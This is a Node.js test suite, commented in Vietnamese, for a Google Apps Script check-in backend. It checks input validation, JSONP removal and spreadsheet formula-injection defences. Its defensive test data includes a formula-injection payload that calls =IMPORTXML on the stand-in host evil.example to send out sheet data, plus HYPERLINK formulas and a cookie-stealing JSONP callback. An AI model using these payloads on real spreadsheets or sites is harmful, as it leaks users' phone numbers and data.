/* =========================================================
   Test google_apps_script.js bằng Node (QA): giả lập SpreadsheetApp / ContentService /
   LockService / Utilities rồi gọi doGet / doPost như Apps Script sẽ gọi.
   Không gọi mạng, không đụng Sheet thật. Chạy: node tests/test-gas.js   (FAIL → exit 1)
   Kiểm: doGet không trả dữ liệu, JSONP callback được lọc, doPost whitelist 10 mức / 6 cảm xúc,
   SĐT Việt Nam, chặn công thức = + - @, giới hạn độ dài, LockService, ghi đúng tab theo tên,
   giờ: giờ máy chủ − ageMs hợp lệ (0…8 ngày) hoặc giờ máy chủ, cùng Mã phiên + cùng SĐT thì cập nhật và giữ cột A,
   SĐT app cũ lệch chuẩn mà ≥ 9 chữ số vẫn ghi (chỉ chữ số), app mới giữ chuẩn Việt Nam chặt,
   khác SĐT thì session_conflict, payload ĐÚNG của app cũ (f76adc9, không Mã phiên) vẫn ghi được.
   ========================================================= */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const APP = path.resolve(__dirname, '..');
const SRC = fs.readFileSync(path.join(APP, 'google_apps_script.js'), 'utf8');
let fails = 0;
let passes = 0;
const T = (name, ok, detail) => { if (ok) passes++; else fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail !== undefined ? '  → ' + String(detail).replace(/\s+/g, ' ').slice(0, 240) : '')); };

/* ===== Giả lập Sheet ===== */
function makeSheet(name) {
  const s = { name, rows: [], frozen: 0, hidden: [], fmt: [], numFmt: [] };
  s.getLastRow = () => s.rows.length;
  s.appendRow = r => { s.rows.push(r.slice()); };
  s.setFrozenRows = n => { s.frozen = n; };
  s.hideColumns = c => { s.hidden.push(c); };
  s.deleteRow = n => { s.rows.splice(n - 1, 1); };
  s.getRange = (r, c, nr, nc) => ({
    getValues: () => Array.from({ length: nr || 1 }, (_, i) => Array.from({ length: nc || 1 }, (_, j) => { const row = s.rows[r - 1 + i] || []; return row[c - 1 + j] == null ? '' : row[c - 1 + j]; })),
    setValues(vals) { vals.forEach((v, i) => { const row = s.rows[r - 1 + i] || (s.rows[r - 1 + i] = []); v.forEach((x, j) => { row[c - 1 + j] = x; }); }); return this; },
    getValue: () => { const row = s.rows[r - 1] || []; return row[c - 1] == null ? '' : row[c - 1]; },
    setValue(x) { const row = s.rows[r - 1] || (s.rows[r - 1] = []); row[c - 1] = x; return this; },
    setNumberFormat(f) { s.numFmt.push(r + ',' + c + ',' + (nr || 1) + 'x' + (nc || 1) + '=' + f); return this; },
    setFontWeight(x) { s.fmt.push(x); return this; }, setBackground(x) { s.fmt.push(x); return this; }, setFontColor(x) { s.fmt.push(x); return this; }
  });
  return s;
}

function load(opts) {
  const o = opts || {};
  const sheets = {};
  let active = null;
  const ss = {
    getSheetByName: n => sheets[n] || null,
    insertSheet: n => (sheets[n] = makeSheet(n)),
    getActiveSheet: () => active
  };
  const lock = { waits: 0, held: 0, max: 0, fail: !!o.lockFail };
  const sandbox = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    ContentService: { MimeType: { JSON: 'json', JAVASCRIPT: 'js' }, createTextOutput: t => ({ text: t, mime: null, setMimeType(m) { this.mime = m; return this; }, getContent() { return this.text; } }) },
    LockService: { getScriptLock: () => ({ waitLock() { if (lock.fail) throw new Error('Lock timeout'); lock.waits++; lock.held++; lock.max = Math.max(lock.max, lock.held); }, releaseLock() { lock.held--; } }) },
    /* Ghi kèm mốc thời gian để test biết giờ lấy từ đâu */
    Utilities: { formatDate: (d, tz, f) => 'TZ[' + tz + '|' + f + '|' + d.getTime() + ']' },
    Logger: { log() {} },
    console
  };
  vm.createContext(sandbox);
  vm.runInContext(SRC, sandbox, { filename: 'google_apps_script.js' });
  if (o.setup) o.setup(sheets, s => { active = s; });
  const P = body => JSON.parse(sandbox.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).getContent());
  const G = p => sandbox.doGet({ parameter: p || {} });
  return { sandbox, sheets, lock, P, G, setActive: s => { active = s; } };
}

const sid = n => 'sess-0000-' + String(n).padStart(4, '0');
const tsOf = cell => Number((/\|(\d+)\]$/.exec(String(cell)) || [])[1]);
const TZ_RE = /^TZ\[Asia\/Ho_Chi_Minh\|HH:mm:ss dd\/MM\/yyyy\|\d+\]$/;
/* Payload ĐÚNG như app cũ đang chạy gửi (ditruyenhungvuong/checkin f76adc9, script.js:325-330) */
const LEGACY = { created_at: '08:00:00 01/10/2026', phone: '0912345678', part1: '7 - Tốt', part2: 'Vui vẻ' };
const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };

/* ===== doGet: không còn đọc dữ liệu ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'], ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  const out = env.G({});
  T('doGet: trả public_read_disabled, MimeType JSON', out.getContent() === '{"result":"error","error":"public_read_disabled"}' && out.mime === 'json', out.getContent());
  T('doGet: không lộ SĐT dù Sheet có dữ liệu', !/0911111111|Rất tồi tệ/.test(out.getContent()));
  const jp = env.G({ callback: 'alert(document.cookie)//' });
  T('doGet: bỏ JSONP – có ?callback= vẫn trả JSON thuần, không trả JavaScript', jp.getContent() === '{"result":"error","error":"public_read_disabled"}' && jp.mime === 'json', jp.getContent());
  T('Nguồn: doGet không gọi getRange/getValues (không có đường đọc bảng)', !/function doGet[\s\S]*?\n}/.exec(SRC)[0].match(/getRange|getValues|sheet_\(/));
}

/* ===== doPost: luồng đúng ===== */
{
  const env = load({ setup: (sheets, setActive) => { setActive((sheets.Khac = makeSheet('Khac'))); } });
  const r = env.P(OK);
  const sh = env.sheets.CheckIn;
  T('POST hợp lệ → success inserted, không trả số dòng', JSON.stringify(r) === '{"result":"success","action":"inserted"}', JSON.stringify(r));
  T('Ghi đúng tab tên "CheckIn" (tự tạo), không ghi vào tab đang mở "Khac"', !!sh && env.sheets.Khac.rows.length === 0);
  T('Tab trống: tạo 5 tiêu đề, đóng băng hàng 1, ẩn cột E', sh.rows[0].join('|') === 'Thời gian|Số điện thoại|Phần 1: Mức cảm xúc|Phần 2: Cảm xúc Capybara|Mã phiên' && sh.frozen === 1 && sh.hidden.includes(5), sh.rows[0].join('|'));
  T('Dòng ghi: giờ Asia/Ho_Chi_Minh (không ageMs → giờ máy chủ), SĐT, "3 - Tồi tệ", "Lo lắng", Mã phiên', TZ_RE.test(sh.rows[1][0]) && Math.abs(tsOf(sh.rows[1][0]) - Date.now()) < 5000 && JSON.stringify(sh.rows[1].slice(1)) === JSON.stringify(['0912345678', '3 - Tồi tệ', 'Lo lắng', sid(1)]), JSON.stringify(sh.rows[1]));
  T('Dòng ghi đặt định dạng văn bản @ chỉ cho dòng đó (giữ số 0 đầu)', sh.numFmt.includes('2,1,1x5=@') && sh.numFmt.length === 1, sh.numFmt.join(' '));
  T('LockService: chờ khóa và nhả khóa', env.lock.waits === 1 && env.lock.held === 0);
  const colA = sh.rows[1][0];
  const r2 = env.P(Object.assign({}, OK, { level: 4, part1: '4 - Kém', ageMs: 3 * 864e5 }));
  T('Cùng Mã phiên + cùng SĐT → updated, vẫn 1 dòng, cập nhật mức, GIỮ cột A (giờ lần đầu)', r2.action === 'updated' && sh.rows.length === 2 && sh.rows[1][2] === '4 - Kém' && sh.rows[1][0] === colA, JSON.stringify(r2) + ' ' + JSON.stringify(sh.rows[1]));
  T('Cập nhật: định dạng @ chỉ đặt cho B–E của dòng đó', sh.numFmt[sh.numFmt.length - 1] === '2,2,1x4=@', sh.numFmt.join(' '));
  const r3 = env.P(Object.assign({}, OK, { phone: '0987654321', level: 10, part2: 'Vui vẻ' }));
  T('Cùng Mã phiên mà KHÁC SĐT → session_conflict, dòng cũ không đổi', JSON.stringify(r3) === '{"result":"error","error":"session_conflict"}' && sh.rows[1][1] === '0912345678' && sh.rows[1][2] === '4 - Kém' && sh.rows.length === 2, JSON.stringify(r3) + ' ' + JSON.stringify(sh.rows[1]));
  env.P(Object.assign({}, OK, { sessionId: sid(2), phone: '+84 987 654 321', level: 10, part2: 'Vui vẻ' }));
  T('Mã phiên khác → thêm dòng; "+84 987 654 321" chuẩn hóa thành 0987654321', sh.rows.length === 3 && sh.rows[2][1] === '0987654321' && sh.rows[2][2] === '10 - Rất tuyệt vời', JSON.stringify(sh.rows[2]));
  env.P({ sessionId: sid(3), phone: '024 3825 1234', level: 7, part2: 'Khó chịu' });
  T('SĐT cố định 11 số 02x được nhận', sh.rows[3] && sh.rows[3][1] === '02438251234', JSON.stringify(sh.rows[3]));
  env.P({ sessionId: sid(5), phone: '0912345678', level: '8', part1: '=HYPERLINK("https://evil";"x")', part2: 'Hoảng hốt', created_at: '=NOW()' });
  T('part1 client gửi bị bỏ, server ghép lại từ bảng; created_at client bị bỏ', sh.rows[4] && sh.rows[4][2] === '8 - Rất tốt' && TZ_RE.test(sh.rows[4][0]), JSON.stringify(sh.rows[4]));
  T('Không ô nào trong Sheet bắt đầu bằng = + - @', sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))));
}

/* ===== App CŨ đang chạy (payload f76adc9, không Mã phiên) – sau khi cập nhật bản triển khai cũ ===== */
{
  const env = load();
  const before = Date.now();
  const r1 = env.P(LEGACY);
  const r2 = env.P(LEGACY);
  const sh = env.sheets.CheckIn;
  T('App cũ: payload đúng {created_at, phone, part1, part2} → success inserted', JSON.stringify(r1) === '{"result":"success","action":"inserted"}', JSON.stringify(r1));
  T('App cũ: đọc mức từ part1 "7 - Tốt", cột E (Mã phiên) để trống', sh.rows[1] && sh.rows[1][1] === '0912345678' && sh.rows[1][2] === '7 - Tốt' && sh.rows[1][3] === 'Vui vẻ' && sh.rows[1][4] === '', JSON.stringify(sh.rows[1]));
  T('App cũ: created_at "08:00:00 01/10/2026" của client bị bỏ, cột A là giờ máy chủ', TZ_RE.test(sh.rows[1][0]) && tsOf(sh.rows[1][0]) >= before, JSON.stringify(sh.rows[1][0]));
  T('App cũ: gửi 2 lần → 2 dòng (không cập nhật nhầm dòng nào)', JSON.stringify(r2) === '{"result":"success","action":"inserted"}' && sh.rows.length === 3);
  const bad = [
    ['created_at là công thức', Object.assign({}, LEGACY, { created_at: '=IMPORTXML("https://evil";"//a")' }), null],
    ['phone công thức', Object.assign({}, LEGACY, { phone: '=1+1+1+1+1' }), 'phone_invalid'],
    ['part1 không có số mức', Object.assign({}, LEGACY, { part1: 'Tốt' }), 'level_invalid'],
    ['part1 "11 - …"', Object.assign({}, LEGACY, { part1: '11 - Rất tuyệt vời' }), 'level_invalid'],
    ['part1 "=7 - Tốt"', Object.assign({}, LEGACY, { part1: '=7 - Tốt' }), 'level_invalid'],
    ['part2 ngoài 6 nhãn', Object.assign({}, LEGACY, { part2: '=HYPERLINK("x")' }), 'emotion_invalid']
  ].map(([n, b, code]) => { const r = env.P(b); return { n, ok: code ? r.error === code : r.result === 'success', r }; });
  T('App cũ: vẫn qua đủ kiểm tra (created_at công thức bị bỏ; SĐT/mức/cảm xúc sai bị từ chối)', bad.every(x => x.ok), bad.filter(x => !x.ok).map(x => x.n + ':' + JSON.stringify(x.r)).join(' | '));
  T('App cũ: không ô nào bắt đầu bằng = + - @', sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))), JSON.stringify(sh.rows));
}

/* ===== ageMs: độ trễ từ lúc bấm tới lúc gửi, giờ = giờ nhận − ageMs (không phụ thuộc đồng hồ điện thoại) ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const cases = [
    ['0 ms (gửi ngay) → giờ nhận', 0, true],
    ['1 giờ (gửi lại sau mất mạng) → giờ nhận − 1 giờ', 3600e3, true],
    ['6 ngày (hàng chờ 7 ngày) → giờ nhận − 6 ngày', 6 * 864e5, true],
    ['đúng 8 ngày → nhận', 8 * 864e5, true],
    ['9 ngày → giờ máy chủ', 9 * 864e5, false],
    ['âm (đồng hồ máy bị chỉnh lùi giữa chừng) → giờ máy chủ', -5000, false],
    ['chuỗi số → giờ máy chủ', '3600000', false],
    ['số lẻ → giờ máy chủ', 3600e3 + 0.5, false],
    ['null → giờ máy chủ', null, false],
    ['mốc tuyệt đối kiểu clientTs (Date.now()) → giờ máy chủ', Date.now(), false]
  ];
  const got = cases.map(([n, age, useAge], i) => {
    const t0 = Date.now();
    const r = env.P(Object.assign({}, OK, { sessionId: sid(100 + i), ageMs: age }));
    const t1 = Date.now();
    const a = tsOf(sh().rows[sh().rows.length - 1][0]);
    const want = useAge ? [t0 - age, t1 - age] : [t0, t1];
    const ok = r.result === 'success' && a >= want[0] && a <= want[1];
    return (ok ? 'ok ' : 'LỖI ') + n + ' (' + a + ')';
  });
  T('ageMs: 4 trường hợp 0…8 ngày ghi giờ nhận − ageMs, 6 trường hợp ngoài khoảng/sai kiểu ghi giờ máy chủ', got.every(x => x.startsWith('ok')), got.join(' | '));
  T('Nguồn: không còn nhận clientTs (giờ tuyệt đối của điện thoại)', !/clientTs/.test(SRC));
}

/* ===== SĐT app cũ lệch chuẩn (review lần 3): vẫn ghi, cột B chỉ chữ số; app mới giữ chặt ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const keep = [
    ['912345678', '912345678'],
    ['01234567890', '01234567890'],
    ['091234567', '091234567'],
    ['09123456789', '09123456789'],
    ['0912345678 chi Lan', '0912345678'],
    ['0084912345678', '0912345678'],
    ['0912 345 678', '0912345678'],
    ['+84 912 345 678', '0912345678'],
    ['(+84)912345678', '0912345678'],
    ['+1 202 555 0143', '0012025550143'],
    ['0912345678 0912345678', '09123456780912345678']
  ];
  const got = keep.map(([raw, want]) => {
    const r = env.P(Object.assign({}, LEGACY, { phone: raw }));
    const b = r.result === 'success' ? sh().rows[sh().rows.length - 1][1] : '';
    return { raw, ok: r.result === 'success' && b === want && /^\d+$/.test(b), got: JSON.stringify(r) + ' B=' + b };
  });
  T('App cũ: ' + keep.length + ' SĐT lệch chuẩn (912345678, 01234567890, 091234567, 09123456789, "0912345678 chi Lan", 0084912345678…) vẫn ghi, cột B chỉ chữ số', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.raw + ':' + g.got).join(' | '));
  const drop = ['=1+1+1+1+1', '+1+1+1+1+1', '-1-1-1-1-1', '@SUM(A1:A9)', '09123456', '12345678', 'abcdefghi', '0912 345 6', '1'.repeat(9) + 'x'.repeat(22)];
  const dropped = drop.map(raw => ({ raw, r: env.P(Object.assign({}, LEGACY, { phone: raw })) }));
  T('App cũ: công thức, chuỗi < 9 chữ số, chuỗi > 30 ký tự vẫn bị từ chối (phone_invalid)', dropped.every(d => d.r.error === 'phone_invalid'), dropped.filter(d => d.r.error !== 'phone_invalid').map(d => d.raw + ':' + JSON.stringify(d.r)).join(' | '));
  T('App cũ: không ô nào bắt đầu bằng = + - @', sh().rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))));
  const strict = ['912345678', '01234567890', '091234567', '09123456789', '0912345678 chi Lan', '0084912345678'];
  const s2 = strict.map((raw, i) => ({ raw, r: env.P(Object.assign({}, OK, { sessionId: sid(300 + i), phone: raw })) }));
  T('App mới (có Mã phiên): 6 mẫu trên vẫn bị từ chối, giữ chuẩn Việt Nam chặt', s2.every(x => x.r.error === 'phone_invalid'), s2.filter(x => x.r.error !== 'phone_invalid').map(x => x.raw + ':' + JSON.stringify(x.r)).join(' | '));
}

/* ===== Mức: whitelist chặt kiểu ===== */
{
  const env = load();
  const loose = [true, [7], '0x7', '1e1', ' 8 ', '7.0', 7.5, -1, 0, 11, {}];
  const got = loose.map(v => { const r = env.P(Object.assign({}, OK, { level: v, part1: '' })); return { v: JSON.stringify(v), ok: r.error === 'level_invalid' }; });
  T('Mức: true, [7], "0x7", "1e1", " 8 ", "7.0", 7.5, -1, 0, 11, {} đều bị từ chối', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.v).join(', '));
  T('Mức: 7 (số) và "7" (chuỗi số) được nhận', env.P(Object.assign({}, OK, { level: 7 })).result === 'success' && env.P(Object.assign({}, OK, { sessionId: sid(2), level: '7' })).result === 'success');
}

/* ===== doPost: chặn dữ liệu xấu ===== */
{
  const env = load();
  const bad = [
    ['phone "=1+1+1+1+1"', Object.assign({}, OK, { phone: '=1+1+1+1+1' }), 'phone_invalid'],
    ['phone =IMPORTXML(...)', Object.assign({}, OK, { phone: '=IMPORTXML("https://evil.example/?d="&JOIN(";";B2:D500);"//a")' }), 'phone_invalid'],
    ['phone "abcdefghi"', Object.assign({}, OK, { phone: 'abcdefghi' }), 'phone_invalid'],
    ['phone 8 số', Object.assign({}, OK, { phone: '09123456' }), 'phone_invalid'],
    ['phone đầu 01 (không còn dùng)', Object.assign({}, OK, { phone: '0123456789' }), 'phone_invalid'],
    ['phone 21 ký tự', Object.assign({}, OK, { phone: '0912345678 0912345678' }), 'phone_invalid'],
    ['phone thiếu', Object.assign({}, OK, { phone: '' }), 'phone_invalid'],
    ['level 0', Object.assign({}, OK, { level: 0 }), 'level_invalid'],
    ['level 11', Object.assign({}, OK, { level: 11 }), 'level_invalid'],
    ['level 2.5', Object.assign({}, OK, { level: 2.5 }), 'level_invalid'],
    ['level "abc"', Object.assign({}, OK, { level: 'abc' }), 'level_invalid'],
    ['cảm xúc rỗng', Object.assign({}, OK, { part2: '' }), 'emotion_required'],
    ['cảm xúc ngoài 6 nhãn', Object.assign({}, OK, { part2: 'Hạnh phúc' }), 'emotion_invalid'],
    ['cảm xúc là công thức', Object.assign({}, OK, { part2: '@SUM(A1)' }), 'emotion_invalid'],
    ['sessionId có ký tự lạ', Object.assign({}, OK, { sessionId: '=1+1+1+1+1+1' }), 'session_invalid'],
    ['sessionId bắt đầu bằng "-"', Object.assign({}, OK, { sessionId: '-abcdefgh' }), 'session_invalid'],
    ['sessionId 7 ký tự', Object.assign({}, OK, { sessionId: 'abc-def' }), 'session_invalid'],
    ['sessionId là số', Object.assign({}, OK, { sessionId: 12345678 }), 'session_invalid'],
    ['sessionId 41 ký tự', Object.assign({}, OK, { sessionId: 'a'.repeat(41) }), 'session_invalid'],
    ['phone là mảng', Object.assign({}, OK, { phone: ['0912345678'] }), 'phone_invalid'],
    ['cảm xúc là mảng', Object.assign({}, OK, { part2: ['Vui vẻ'] }), 'emotion_invalid']
  ];
  const got = bad.map(([n, body, code]) => { const r = env.P(body); return { n, ok: r.result === 'error' && r.error === code && !r.retry, r }; });
  T(bad.length + ' payload xấu đều bị từ chối đúng mã lỗi, không retry', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.n + ':' + JSON.stringify(g.r)).join(' | '));
  T('Payload xấu: không dòng nào được ghi (tab chưa tạo hoặc chỉ có tiêu đề)', !env.sheets.CheckIn || env.sheets.CheckIn.rows.length <= 1);
  T('Payload xấu: không chờ khóa (kiểm trước, ghi sau)', env.lock.waits === 0);
  T('Body > 2000 ký tự → too_large', env.P(JSON.stringify(Object.assign({}, OK, { pad: 'x'.repeat(2100) }))).error === 'too_large');
  T('Body không phải JSON → bad_json', env.P('khong phai json').error === 'bad_json');
  T('Body JSON là chuỗi "abc" → bad_json', env.P('"abc"').error === 'bad_json');
  T('Body JSON là mảng → bad_json', env.P('[1,2]').error === 'bad_json');
  T('Không postData → no_data', JSON.parse(env.sandbox.doPost({}).getContent()).error === 'no_data' && JSON.parse(env.sandbox.doPost(undefined).getContent()).error === 'no_data');
}

/* ===== Khóa bận → báo retry, không lộ lỗi nội bộ ===== */
{
  const env = load({ lockFail: true });
  const r = env.P(OK);
  T('Khóa bận: {result:error, error:server_busy, retry:true}, không kèm thông điệp nội bộ', JSON.stringify(r) === '{"result":"error","error":"server_busy","retry":true}', JSON.stringify(r));
}

/* ===== Tab cũ 4 cột (dữ liệu từ bản trước) ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'], ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  env.P(OK);
  const sh = env.sheets.CheckIn;
  T('Tab cũ: thêm tiêu đề E "Mã phiên" + ẩn, không đụng A–D và dòng cũ', sh.rows[0][4] === 'Mã phiên' && sh.rows[0][0] === 'Thời gian' && sh.hidden.includes(5) && sh.rows[1][1] === '0911111111' && sh.rows.length === 3, JSON.stringify(sh.rows));
  T('Tab cũ: định dạng @ chỉ đặt cho dòng mới (dòng 3)', sh.numFmt.join(' ') === '3,1,1x5=@', sh.numFmt.join(' '));
}

/* ===== Nhãn khớp với script.js ===== */
{
  const js = fs.readFileSync(path.join(APP, 'script.js'), 'utf8');
  const levels = [];
  for (const m of js.matchAll(/^\s*(\d+):\s*\{\s*text:\s*"([^"]*)"/mg)) levels[Number(m[1])] = m[2];
  const env = load();
  T('LEVEL_TEXTS trùng emotionLevels trong script.js', JSON.stringify(env.sandbox.LEVEL_TEXTS.slice(1)) === JSON.stringify(levels.slice(1)), JSON.stringify(levels));
  const emo = (js.match(/const EMOTIONS = \[([^\]]*)\]/) || [])[1] || '';
  T('EMOTION_LABELS trùng EMOTIONS trong script.js', JSON.stringify(env.sandbox.EMOTION_LABELS) === JSON.stringify(emo.split(',').map(x => x.trim().replace(/^'|'$/g, ''))), emo);
  /* normalizePhone hai phía phải cho cùng kết quả */
  const clientFn = (js.match(/function normalizePhone\(raw\) \{[\s\S]*?\n\}/) || [''])[0];
  const ctx = {}; vm.createContext(ctx); vm.runInContext(clientFn, ctx);
  const samples = ['0912345678', '0912 345 678', '+84912345678', '84912345678', '+84 24 3825 1234', '02438251234', '0123456789', 'abc', '=1+1', '', '091234567', '09123456789', '(091) 234-5678', '0912.345.678'];
  const diff = samples.filter(s => ctx.normalizePhone(s) !== env.sandbox.normalizePhone_(s));
  T('normalizePhone (web) và normalizePhone_ (server) giống nhau trên 14 mẫu', clientFn && diff.length === 0, diff.join(', '));
}

/* ===== Nguồn: hướng dẫn cài và các chốt ===== */
T('Nguồn: có hướng dẫn tạo TRIỂN KHAI MỚI (URL cũ đã lộ)', /TẠO BẢN TRIỂN KHAI MỚI/.test(SRC) && /Triển khai mới \(New deployment\)/.test(SRC));
T('Nguồn: không dùng getActiveSheet()', !/getActiveSheet\(/.test(SRC.replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, '')));
T('Nguồn: không còn ALLOW_PUBLIC_READ hay đường đọc toàn bảng', !/ALLOW_PUBLIC_READ|readAll_/.test(SRC));
T('Nguồn: hướng dẫn có bước CẬP NHẬT bản triển khai CŨ lên phiên bản mới, đứng TRƯỚC bước triển khai mới', /BƯỚC 3 – CẬP NHẬT LUÔN BẢN TRIỂN KHAI CŨ/.test(SRC) && SRC.indexOf('BƯỚC 3 – CẬP NHẬT LUÔN') < SRC.indexOf('BƯỚC 5 – TẠO BẢN TRIỂN KHAI MỚI') && /Phiên bản mới \(New version\)/.test(SRC));
T('Nguồn: bước kiểm công thức dùng Ctrl+H + "Tìm kiếm trong cả công thức", nhắc cột A', /Ctrl\+H/.test(SRC) && /Tìm kiếm trong cả công thức/.test(SRC) && /cột A, B, C, D/.test(SRC));
T('Nguồn: không còn trả JavaScript (JSONP)', !/MimeType\.JAVASCRIPT/.test(SRC));

console.log('\n' + passes + ' PASS, ' + fails + ' FAIL (Apps Script giả lập)');
process.exit(fails ? 1 : 0);
